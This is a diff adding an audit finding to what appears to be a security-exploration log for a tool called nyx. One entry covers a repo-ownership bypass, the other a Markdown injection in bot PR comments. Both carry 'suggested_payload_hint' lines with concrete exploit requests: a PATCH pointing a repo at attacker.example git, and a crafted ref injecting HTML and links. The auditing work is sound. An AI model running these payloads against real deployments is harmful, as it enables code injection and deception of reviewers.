@@ -687,3 +687,15 @@ record_exploration_finding
   "rationale": "create_project_repo (router.rs:737) demands `i_own_this:true` on every create. patch_project_repo only refuses `i_own_this:false` explicitly (router.rs:838) and otherwise leaves the prior attestation in place while letting the caller swap `source_kind` *and* `source_url_or_path` to anything in {git, github, gitlab, local-path, local}. Net result: an authenticated caller (or anyone holding a leaked bearer; combine with the URL-query-token logging issue at router.rs:132) can take a repo the operator owns, point it at attacker-controlled git over HTTPS, and the next scheduled scan ingests attacker code into the sandboxed scan_pipeline — including any subsequent `replay_repro_bundle` flows. The ownership attestation is a single bit attached to the row name; it's never re-bound to the (kind, url) tuple. State-machine flaw: the invariant `i_own_this ⇒ operator vetted the *current* source` decays the moment PATCH fires. Static pass missed because no flow is tainted — the bug is the absence of re-attestation on source mutation.",
   "suggested_payload_hint": "with a valid bearer: PATCH /api/v1/projects/default/repos/<existing>, body {\"source_kind\":\"git\",\"source_url_or_path\":\"https://attacker.example/payload.git\"} — 200 OK, then wait for the next scan trigger or call POST /api/v1/projects/default/scan?repo=<existing>."
 }
+
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent/src/cmd/pr_comment.rs",
+  "line": 167,
+  "cap": "MARKDOWN_INJECTION",
+  "endpoint": "<bot:github-pr-comment>",
+  "rationale": "build_comment_body wraps every operator/attacker-influenced field (repo, path, rule, id, chain id) with `code_safe()`, which grows the inline-code fence to be longer than any backtick run inside the value. But two fields skip this helper: line 167 emits `Diff base: \\`{}\\`` from `report.since_ref`, and line 170 emits `Run ID \\`{}\\`` from `report.run_id`. `since_ref` is the operator's `--since-ref` CLI input — in CI this is typically the PR head/base ref, attacker-controllable when the PR is filed against a fork. A ref name containing a single backtick (e.g. `foo\\`</code><img src=x onerror=…>`) breaks out of the single-tick code span and injects arbitrary Markdown / HTML into a comment authored by the trusted nyx-agent bot identity. Renders cleanly on github.com; reviewers see a plausible bot post that contains attacker-chosen links and images. Missed by the static pass because both surrounding `code_safe()` calls and the `code_safe_escapes_embedded_backticks` test exist — the gap is a *missing* call, not a tainted-flow sink. The test suite even has `comment_body_neutralises_attacker_backticks_in_path` but no parallel test for `since_ref` or `run_id`.",
+  "suggested_payload_hint": "scan --since-ref 'main\\`</code>[click](https://attacker.example)\\`' --output report.json && pr-comment --report report.json --repo o/r --pr 1 — open the resulting PR comment and confirm the injected link renders as live Markdown rather than literal backticks."
+}
